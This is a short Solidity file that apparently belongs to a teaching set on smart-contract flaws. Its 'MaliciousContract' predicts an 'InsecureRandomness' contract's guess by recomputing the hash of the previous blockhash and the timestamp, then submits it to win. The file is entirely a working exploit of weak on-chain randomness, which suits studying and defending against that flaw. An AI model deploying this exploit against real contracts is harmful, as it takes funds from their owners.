// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "./InsecureRandomness.sol";

contract MaliciousContract {
    receive() external payable {}

    function attack(InsecureRandomness vulnerable) public {
        vulnerable.guess(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );
    }
}